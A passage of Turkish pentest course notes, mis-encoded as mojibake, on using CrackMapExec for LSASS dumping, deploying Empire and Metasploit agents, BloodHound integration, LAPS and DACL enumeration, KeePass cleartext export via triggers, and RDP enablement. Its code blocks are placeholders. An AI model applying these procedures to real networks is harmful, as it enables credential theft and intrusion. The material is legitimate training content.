* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

